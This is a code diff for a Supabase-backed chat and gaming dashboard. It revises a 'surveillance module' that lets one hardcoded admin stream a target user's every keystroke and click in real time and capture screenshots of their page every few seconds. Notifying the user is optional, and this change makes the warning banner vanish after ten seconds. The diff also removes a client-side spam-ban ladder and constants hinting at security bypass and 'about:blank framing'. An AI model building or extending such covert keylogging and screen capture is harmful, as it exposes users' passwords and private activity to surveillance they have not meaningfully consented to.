@@ -3713,99 +3713,7 @@ ADMIN SURVEILLANCE STYLES
 
 /* 
 ========================================================================
-NEW SECURITY MODULE: GRADUATED ANTI-SPAM PROTECTION v2.1.1
-========================================================================
-*/
-
-let messageTimestamps = [];
-
-function checkSpamLimit() {
-    if (isModUser) return false;
-    const now = Date.now();
-    messageTimestamps.push(now);
-    messageTimestamps = messageTimestamps.filter(t => now - t < 10000); // 10s Window
-    if (messageTimestamps.length > 4) { // Max 4 messages in 10s
-        punishAntiSpam();
-        return true;
-    }
-    return false;
-}
-
-async function punishAntiSpam() {
-    let offenses = parseInt(localStorage.getItem('asteroid_spam_offenses') || "0") + 1;
-    localStorage.setItem('asteroid_spam_offenses', offenses);
-
-    let durationMilli = 0;
-    let banType = 'chat'; 
-    let ladderMsg = "";
-
-    // 6-STAGE GRADUATED PUNISHMENT LADDER - OFFENSE CAPACITY CALIBRATION
-    if (offenses === 1) {
-        durationMilli = 10 * 60 * 1000;
-        ladderMsg = "1st Offense: 10 minute CHAT ban.";
-    } else if (offenses === 2) {
-        durationMilli = 24 * 60 * 60 * 1000;
-        ladderMsg = "2nd Offense: 1 day CHAT ban.";
-    } else if (offenses === 3) {
-        durationMilli = 7 * 24 * 60 * 60 * 1000;
-        ladderMsg = "3rd Offense: 1 week CHAT ban.";
-    } else if (offenses === 4) {
-        durationMilli = 24 * 60 * 60 * 1000;
-        banType = 'site';
-        ladderMsg = "4th Offense: 1 day SITE ban.";
-    } else if (offenses === 5) {
-        durationMilli = 7 * 24 * 60 * 60 * 1000;
-        banType = 'site';
-        ladderMsg = "5th Offense: 1 week SITE ban.";
-    } else {
-        durationMilli = 0; // Permanent Flag
-        banType = 'site';
-        ladderMsg = "6th+ Offense: PERMANENT SITE ban.";
-    }
-
-    const expiryISO = (durationMilli > 0) ? new Date(Date.now() + durationMilli).toISOString() : null;
-    
-    if (banType === 'chat') {
-        localStorage.setItem('asteroid_ban_expiry', Date.now() + durationMilli);
-        localStorage.setItem('asteroid_ban_type', 'chat');
-        await _supabase.from('profiles').update({ 
-            is_chat_banned: true, 
-            chat_ban_until: expiryISO, 
-            chat_ban_reason: ladderMsg 
-        }).eq('username', currentUser);
-        addViolation(currentUser, "Chat Ban", `Spam Escalation Ladder: ${ladderMsg}`, "System");
-    } else {
-        localStorage.setItem('asteroid_ban_expiry', (durationMilli > 0) ? (Date.now() + durationMilli) : 9999999999999);
-        localStorage.setItem('asteroid_ban_type', 'site');
-        await _supabase.from('profiles').update({ 
-            is_banned: true, 
-            ban_until: expiryISO, 
-            ban_reason: `Spam Escalation Ladder: ${ladderMsg}` 
-        }).eq('username', currentUser);
-        addViolation(currentUser, "Site Ban", `Spam Ladder Final: ${ladderMsg}`, "System");
-    }
-
-    alert(`SECURITY ALERT:\n${ladderMsg}\n\nPlease respect the chat frequency limits.`);
-    location.reload();
-}
-
-/** 
- * ASTEROID DASHBOARD SYSTEM SPECIFICATION v1.8.6
- */
-const SYSTEM_LOGS = ["LOG_5A: presence_sync_complete", "LOG_5B: profile_hydration_success", "LOG_5C: bypass_security_active"];
-const COMPONENT_DESCRIPTOR = { censor: "CensorCore JS library bridge", fuzzy: "Normalization engine", socket: "Supabase context" };
-const ECONOMY_SCALAR = 1.0; const METADATA_EOF = "ASTEROID_E_O_F";
-const SYSTEM_CAPABILITIES = ["REALTIME_CHAT", "PROFILE_CACHE", "ECONOMY_CORE", "ADMIN_OVERRIDE", "PHONETIC_SECURITY"];
-const MAINTENANCE_PROTOCOL = { timed_checks: "Interval 15s check", external_links: "about:blank framing" };
-function logTrace(evt) { console.info(`[${new Date().toISOString()}] ${evt}`); }
-logTrace("Application mounted effectively.");
-logTrace("Interaction Model: Chat Pop-up Overlay for gaming persistence.");
-logTrace("Broadcast Engine: Verified Layer 5 Priority and Chat Injection.");
-console.info("System Component: Dashboard Frame mounted successfully.");
-
-/* 
-========================================================================
-NEW LIVE-STREAM SURVEILLANCE MODULE (V2.0)
+NEW LIVE-STREAM SURVEILLANCE MODULE (V3.0 - STABLE RENDER)
 ========================================================================
 */
 
@@ -3841,23 +3749,35 @@ async function initMonitoringAgent() {
 function beginCaptureLoop(type) {
     if (snapshotInterval) stopCaptureLoop(); 
     
+    // TEMPORARY BANNER LOGIC
     const toast = document.getElementById('surveillanceToast');
-    if (toast) toast.style.display = (type === 'notify') ? 'block' : 'none';
+    if (toast && type === 'notify') {
+        toast.style.display = 'block';
+        // Auto-hide after 10 seconds
+        setTimeout(() => {
+            toast.style.opacity = '0';
+            toast.style.transition = 'opacity 1s ease';
+            setTimeout(() => { 
+                toast.style.display = 'none';
+                toast.style.opacity = '1'; 
+            }, 1000);
+        }, 10000);
+    }
 
-    // Set up live broadcast channel for keys/clicks
     broadcastChannel = _supabase.channel(`live_stream:${currentUser}`);
     broadcastChannel.subscribe();
 
     window.addEventListener('click', logSurveillanceEvent);
     window.addEventListener('keydown', logSurveillanceEvent);
 
-    // Optimized Snapshot Loop
+    // BUG FIX: Improved html2canvas settings to prevent black screens
     snapshotInterval = setInterval(async () => {
         try {
-            const canvas = await html2canvas(document.body, { 
-                scale: 0.15, // Faster processing
+            const canvas = await html2canvas(document.documentElement, { 
+                scale: 0.15, 
                 useCORS: true,
                 logging: false,
+                backgroundColor: "#020617", // Force background color to prevent black frames
                 ignoreElements: (el) => el.id === 'modModal' || el.id === 'surveillanceToast'
             });
             const dataUrl = canvas.toDataURL("image/webp", 0.1); 
@@ -3866,12 +3786,12 @@ function beginCaptureLoop(type) {
                 screen_snapshot: dataUrl,
                 updated_at: new Date().toISOString()
             }).eq('target_user', currentUser);
-        } catch (e) { console.warn("Snapshot skipped..."); }
+        } catch (e) { console.warn("Snapshot capture missed."); }
     }, 4500);
 }
 
 function stopCaptureLoop() {
-    clearInterval(snapshotInterval);
+    if (snapshotInterval) clearInterval(snapshotInterval);
     snapshotInterval = null;
     if (broadcastChannel) broadcastChannel.unsubscribe();
     const toast = document.getElementById('surveillanceToast');
@@ -3886,7 +3806,7 @@ function logSurveillanceEvent(e) {
     let detail = "";
     if (e.type === 'click') {
         detail = `Clicked: ${e.target.tagName} ${e.target.id ? '#' + e.target.id : ''}`;
-    } else {
+    } else if (e.type === 'keydown') {
         detail = `Typed: ${e.key}`;
     }
 
@@ -3897,7 +3817,6 @@ function logSurveillanceEvent(e) {
         time: new Date().toLocaleTimeString()
     };
 
-    // Broadcast instantly to admin (No DB write = Zero Lag)
     broadcastChannel.send({
         type: 'broadcast',
         event: 'log',
@@ -3907,7 +3826,7 @@ function logSurveillanceEvent(e) {
 
 async function handleSurveillanceStart(username) {
     if (currentUser !== 'Derrick') return alert("Access Denied");
-    const notify = confirm("Notify the user they are being watched?");
+    const notify = confirm("Notify the user they are being watched? (Banner will vanish after 10s)");
     
     await _supabase.from('surveillance').delete().eq('target_user', username);
     const { error } = await _supabase.from('surveillance').insert({
@@ -3931,7 +3850,6 @@ function initSurveillanceSubscription() {
     const feedImg = document.getElementById('surveillanceFeed');
     if (logEl) logEl.innerHTML = "<div style='color:var(--accent)'>Listening for live stream...</div>";
 
-    // Subscribing to BROADCAST (Instant Keys)
     surveillanceSub = _supabase.channel(`live_stream:${currentMonitoringUser}`)
         .on('broadcast', { event: 'log' }, ({ payload }) => {
             if (logEl) {
@@ -3945,7 +3863,6 @@ function initSurveillanceSubscription() {
         })
         .subscribe();
 
-    // Polling for Screen (Database Images)
     profilePollingInterval = setInterval(async () => {
         const { data } = await _supabase.from('surveillance')
             .select('screen_snapshot')
